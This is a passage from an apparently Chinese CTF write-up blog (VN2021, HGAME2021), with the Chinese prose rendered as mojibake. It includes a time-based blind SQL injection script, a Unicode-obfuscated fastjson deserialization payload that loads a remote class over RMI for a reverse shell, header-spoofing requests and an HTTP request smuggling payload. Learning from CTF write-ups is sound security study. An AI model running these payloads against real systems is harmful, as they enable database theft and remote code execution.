<span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># éšæœºè®¿é—®</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># ä¸é™åˆ¶è¶…æ—¶</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504å³ä¸ºæ­£ç¡®</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># äºŒåˆ†æ³•~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># å­©å­æ²¡è·‘äº†ï¼Œå¤ªå¡äº†</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># å­©å­æ²¡è·‘äº†ï¼Œå¤ªå¡äº†</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>å­©å­å®åœ¨è·‘ä¸ä¸‹å»äº†</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>pyå‡ºé¢˜äººæ¢äº†å¯†ç <code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>ç™»å½•æˆåŠŸ</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>jsåŠ è½½å›¾ç‰‡</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>å‘ç°<code>/searchimage</code>å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œè¯»ä¸åˆ°flagï¼Œå¯èƒ½åå­—ä¸å¯¹ï¼Œè¯»åˆ°äº†<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>æŠ“åŒ…çœ‹</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>ç»“åˆåº”è¯¥æ˜¯fastjsonååºåˆ—åŒ–æ¼æ´</p><h4 id="fastjson-lt-1-2-68ååºåˆ—åŒ–æ¼æ´"><a href="#fastjson-lt-1-2-68ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="fastjson &lt;1.2.68ååºåˆ—åŒ–æ¼æ´"></a>fastjson &lt;1.2.68ååºåˆ—åŒ–æ¼æ´</h4><p>ç›´æ¥payloadè¯•ä¸€ä¸‹ï¼Œè¢«banäº†</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>éœ€è¦ç»•è¿‡ï¼ŒJSONObject.parseObject()ä¼šè‡ªåŠ¨ä¼šæŠŠjsonå­—ç¬¦ä¸²ä¸­çš„Unicodeç è¿›è¡Œè½¬æ¢ï¼Œæ‰€ä»¥è½¬æˆUnicodeå³å¯</p><p>æœåŠ¡å™¨èµ· <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>å†èµ·ç›‘å¬ç«¯å£</p><p>æœ€åæ‰“payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;<span class="token comment">// éœ€è¦Unicodeç¼–ç </span></code></pre><img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy"><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span><span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span><span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>;</code></pre><p>æœåŠ¡å™¨åŠ è½½äº†æ¶æ„classæ–‡ä»¶ï¼ŒæˆåŠŸgetshell</p><img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy"><p>ç¼–ç é—®é¢˜ï¼Œæ•´äº†ä¸€ä¸ªå°æ—¶å°±æ˜¯åå¼¹ä¸äº†shellï¼ŒåŸæ¥æ˜¯javaåå¼¹shellçš„ç¼–ç é—®é¢˜ï¼Œå»<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">ç½‘ç«™</a>ç¼–ç ä¸€ä¸‹å°±æˆåŠŸäº†</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­©å­å¥½èœï¼Œè¢«ã€Šç®€å•çš„ç­¾åˆ°ã€‹æå‚»äº†ã€‚æŸ¥é˜…äº†ä¸å°‘èµ„æ–™ï¼Œæ‹œè¯»äº†å¾ˆå¤šå¤§ä½¬çš„åšå®¢ï¼Œè™½ç„¶æœ€åè¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œç­‰ç­‰WPåº·åº·å¤§ä½¬çš„æ€è·¯ä¹Ÿè®¸æ¯”è‡ªå·±å¿™æ´»åŠå¤©æœ‰ç”¨ï¼Œå½“ç„¶å°‘ä¸äº†åŸç†çš„ç ”ç©¶ã€‚</p><p>ç»§ç»­å­¦ä¹ å•¦</p><p>ï¼ˆæƒ³ç»“è¯†æ›´å¤šå¤§ä½¬ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2021</title>
      <link href="article/hgame2021/"/>
      <url>article/hgame2021/</url>
      
        <content type="html"><![CDATA[<p>HAME2021-week ä¸ªäººWP</p><p>æ˜µç§°ï¼šErr0r</p><a id="more"></a><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><p>è¿™æ˜¯week1ï¼Œåšäº†Webå’Œéƒ¨åˆ†Miscï¼Œåç»­ä¼šæ•´åˆæˆä¸€ç¯‡æ–‡ç« (å…ˆè®©æˆ‘æ°´ç€)</p><img src="/article/hgame2021/image-20210206151019347.png" class="" title="image-20210206151019347" loading="lazy"><p><strong>ç”±äºæŸäº›åŸå› ï¼Œä»¥åä¼šæ³¨é‡åŸç†ä¸Šçš„ç ”ç©¶</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>é¢˜ç›®æè¿°ï¼š ç¬¬ä¸€æ¬¡åœ¨é“¶æ²³ç³»é‡Œæ­é¡ºé£è½¦ï¼Œè¦å‡†å¤‡å•¥ï¼Œåœ¨çº¿ç­‰ï¼ŒæŒºæ€¥çš„ </p><p>é¢˜ç›®åœ°å€ï¼š <a href="http://hitchhiker42.0727.site:42420/">http://hitchhiker42.0727.site:42420</a> </p><img src="/article/hgame2021/image-20210206151406243.png" class="" title="image-20210206151406243" loading="lazy"><p>æŠ“åŒ…çœ‹çœ‹é¡ºé£è½¦å•¥æ ·</p><img src="/article/hgame2021/image-20210206151614330.png" class="" title="image-20210206151614330" loading="lazy"><p>çŠ¶æ€ç 405Method Not Allowed</p><p>å¯¹äºä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚éƒ½è¦è¿›è¡Œä¸€å¥—æµç¨‹ï¼Œå³DNSè§£æåŸŸåè¿”å›IPï¼Œæ‰“å¼€IPå¥—æ¥å­—(socket)è¿æ¥IPï¼Œå†é€šè¿‡å¥—æ¥å­—å†™HTTPæ•°æ®æµï¼Œæœ€åä»WEBæœåŠ¡å™¨æ¥å—å“åº”çš„HTTPæ•°æ®æµã€‚è€Œ405çŠ¶æ€ç å°±æ˜¯æœ€åä¸€æ­¥ç”Ÿæˆçš„ï¼Œå³æœåŠ¡å™¨ä¸å“åº”è¿™ç§è¯·æ±‚æ–¹å¼ï¼Œè¯·æ±‚æ–¹å¼æœ‰GET/POST/HEAD/PUTç­‰ï¼Œæ¢æˆPOSTçœ‹çœ‹ã€‚</p><blockquote><p>æ³¨æ„:åœ¨burpsuiteé‡Œé¢ï¼Œå³é”®æ”¹å˜è¯·æ±‚æ–¹å¼å³å¯</p><img src="/article/hgame2021/image-20210206152237254.png" class="" title="change" loading="lazy"></blockquote><p>éšåæç¤º<code>åªæœ‰ä½¿ç”¨&quot;æ— é™éæ¦‚ç‡å¼•æ“&quot;(Infinite Improbability Drive)æ‰èƒ½è®¿é—®è¿™é‡Œï½</code></p><img src="/article/hgame2021/image-20210206152332459.png" class="" title="image-20210206152332459" loading="lazy"><p>è¿™é‡Œåªè¦æ”¹UAå°±è¡Œäº†ï¼ŒUser-Agent ç®€å•æ¥è¯´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨è®¿é—®è€…æ˜¯é€šè¿‡ä»€ä¹ˆå·¥å…·æ¥è¯·æ±‚çš„ï¼Œæ·»åŠ <code>Infinite Improbability Drive</code>æˆ–è€…ç›´æ¥åˆ æ‰UAåªåŠ è¿™ä¸ªä¹Ÿå¯ä»¥</p><p>éšåæç¤º</p><pre class="language-none"><code class="language-none">ä½ çŸ¥é“å—ï¼Ÿ&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;github.com&#x2F;wuhan005&quot;&gt;èŒ„å­&lt;&#x2F;a&gt;ç‰¹åˆ«è¦æ±‚ï¼šä½ å¾—ä»ä»–çš„&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;cardinal.ink&#x2F;&quot;&gt;Cardinal&lt;&#x2F;a&gt;è¿‡æ¥</code></pre><img src="/article/hgame2021/image-20210206152624452.png" class="" title="image-20210206152624452" loading="lazy"><p>è¿™é‡Œæ˜¯è¦æ”¹Refererï¼Œç®€å•æ¥è¯´å°±æ˜¯å‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ï¼Œç”¨æ³•ä¸€èˆ¬æ˜¯ä¸ºäº†é˜²å¤–è¿æ¥ï¼Œç›´æ¥ç”¨<code>&lt;a href=&quot;&quot;&gt;</code>ï¼Œ<code>ç”¨Submitæˆ–&lt;input type=&quot;image&quot;&gt;æäº¤çš„è¡¨å•(POSTæˆ–GET)</code>ï¼Œæˆ–è€…<code>ä½¿ç”¨JavaScriptæäº¤çš„[è¡¨å•](https://baike.baidu.com/item/è¡¨å•)(POSTæˆ–GET)</code>éƒ½æ˜¯ä¼šå¸¦ä¸ŠRefererï¼Œå½“ç„¶ä¼ªé€ ä¹Ÿå¾ˆç®€å•ã€‚</p><p>æœ€åæç¤º<code>flagä»…èƒ½é€šè¿‡æœ¬åœ°è®¿é—®è·å¾—</code></p><img src="/article/hgame2021/image-20210206153338355.png" class="" title="image-20210206153338355" loading="lazy"><p>å¾ˆç®€å•çš„XFFï¼ŒXFFå°±æ˜¯è¡¨ç¤ºå®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€ï¼Œä¹Ÿæ˜¯å¾ˆå®¹æ˜“ä¼ªé€ </p><img src="/article/hgame2021/image-20210206153608572.png" class="" title="image-20210206153608572" loading="lazy"><p>pythonè„šæœ¬å¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/2/6 15:57@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://hitchhiker42.0727.site:42420/HitchhikerGuide.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span> <span class="token punctuation">:</span> <span class="token string">"Infinite Improbability Drive"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span> <span class="token punctuation">:</span> <span class="token string">"https://cardinal.ink/"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span> <span class="token punctuation">:</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">&#125;</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>çœ‹ç€ç›´è§‚ç‚¹</p><hr><h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>é¢˜ç›®æè¿°ï¼š ç®€å•ä¸”ä¸Šå¤´çš„æ¸¸æˆ </p><p>é¢˜ç›®åœ°å€ ï¼š <a href="http://watermelon.ryen.xyz:800/">http://watermelon.ryen.xyz:800/</a> </p><p>ç´§è·Ÿæ½®æµçš„å°æ¸¸æˆï¼Œä½œè€…æŠŠæºç å…¬å¼€äº†ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤šäºŒåˆ›ã€‚æŠ¢äº†ä¸ªä¸€è¡€</p><img src="/article/hgame2021/first.png" class="" title="first" loading="lazy"><p>æ‰‹å¿«2333</p><img src="/article/hgame2021/image-20210206153657660.png" class="" title="image-20210206153657660" loading="lazy"><p>çœ‹åˆ°å°æ¸¸æˆé¢˜ï¼Œç¬¬ä¸€çœ¼çœ‹jsï¼Œgithubæœä¸€åœˆäº†è§£åˆ°è¿™ä¸ªæ¸¸æˆçš„æºç åœ¨./src/project.jsã€‚ä½†æ˜¯ä»£ç å››åƒè¡Œï¼Œå› ä¸ºæ¸¸æˆå¼€æºï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“èƒ½æ‰¾åˆ°åˆ†æçš„æºç èµ„æ–™ï¼Œ<a href="https://www.cnblogs.com/xuanyu-10-18/p/14340204.html">å‚è€ƒé“¾æ¥</a>ï¼Œç›´æ¥æœåˆ°æ§åˆ¶åˆ†æ•°çš„ä»£ç ï¼Œæ”¹æ‰</p><img src="/article/hgame2021/image-20210206155153207.png" class="" title="image-20210206155153207" loading="lazy"><p>å¯ä»¥çœ‹åˆ°è¿™ä¸€å—3436è¡Œ<code>default.score</code>æ˜¯è®¡åˆ†å—ï¼Œæ”¹æˆ+999999ä¿å­˜ï¼Œç„¶åæŠŠæ¸¸æˆç©ç»“æŸå¼¹flag</p><img src="/article/hgame2021/image-20210206155459828.png" class="" title="image-20210206155459828" loading="lazy"><hr><h3 id="å®è—èµ°ç§è€…"><a href="#å®è—èµ°ç§è€…" class="headerlink" title="å®è—èµ°ç§è€…"></a>å®è—èµ°ç§è€…</h3><p>é¢˜ç›®æè¿°ï¼š </p><p><strong>èµ„æ–™ï¼š<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></strong><br>å®è—èµ°ç§è€… Switch å–œæ¬¢å·ç›—å¹¶å°†å¥‡ç‰¹çš„å®è—èµ°ç§åˆ°ä¸€äº›é»‘å¸‚å•†å®¶æ‰‹ä¸­ã€‚<br>ä¸ºäº†é˜»æ­¢å…¶ç»§ç»­ä½œæ¶ï¼Œè­¦æ¢ Liki å¥‰å‘½å°† Switch æŠ“æ•å½’æ¡ˆã€‚<br>è°ƒæŸ¥è¿‡ç¨‹ä¸­ï¼ŒLiki å‘ç° Switch å°†ä¸€ä¸ªç§˜å¯†è—åœ¨äº†ä¸€ä¸ªç§äººæœåŠ¡å™¨ä¸­ã€‚<br>è¿™æˆ–è®¸ä¼šæˆä¸ºåç»­è¿½æŸ¥ Switch çš„é‡å¤§çº¿ç´¢ï¼Œä½ èƒ½æ‰¾åˆ°è¿™ä¸ªç§˜å¯†å—ï¼Ÿ </p><p>é¢˜ç›®é“¾æ¥ï¼š <a href="http://thief.0727.site/">http://thief.0727.site:80</a> </p><p><strong>hint: æ³¨æ„ç•™æ„æœåŠ¡å™¨ä¿¡æ¯</strong> </p><p>HTTPè¯·æ±‚èµ°ç§ï¼Œèµ„æ–™é‡Œè®²çš„å¾ˆè¯¦ç»†ï¼Œå»ºè®®ä»”ç»†è¯»ä¸€ä¸‹ï¼Œè¿™é‡Œä¸åšè¿‡å¤šé˜è¿°</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1Host: thief.0727.sitePragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.104 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Content-Length: 95Transfer-Encoding: chunked0GET &#x2F;secret HTTP&#x2F;1.1Content-Length: 